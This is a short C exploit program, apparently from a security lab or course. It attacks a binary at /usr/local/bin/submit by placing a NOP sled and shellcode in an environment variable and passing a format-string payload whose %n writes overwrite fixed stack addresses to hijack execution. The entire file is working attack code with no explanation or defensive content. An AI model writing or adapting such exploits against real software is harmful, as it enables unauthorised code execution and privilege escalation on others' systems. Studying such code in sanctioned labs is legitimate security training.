#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define TARGET "/usr/local/bin/submit"
#define BUFFER_SIZE                    2060
#define ENV_SIZE		       2048	 
#define NOP                            0x90


int main(int argc, char *argv[]) {
  int bsize = BUFFER_SIZE;
  int esize = ENV_SIZE;
  
  char *ptr, *egg;
   
  char *args[4];
  char *env[2];

  //Format string required padding to have addresses at 4 byte offsets 
  char *hack = "\xec\xd5\xbf\xff\xee\xd5\xbf\xff\xaa\xaa%55259c%114$n%10202c%115$n";

  if (!(egg = malloc(esize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
 
  //Copy the NOP sled and shellcode into egg
  memset(egg, NOP, esize);
  ptr = egg + 128;
  memcpy(ptr, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  args[1] = hack;
  args[2] = "message"; 
  args[3] = NULL;

  // Pass egg into an environment variable
  env[0] = egg;
  env[1] = NULL;

  execve(TARGET, args, env);

  return 0;
}
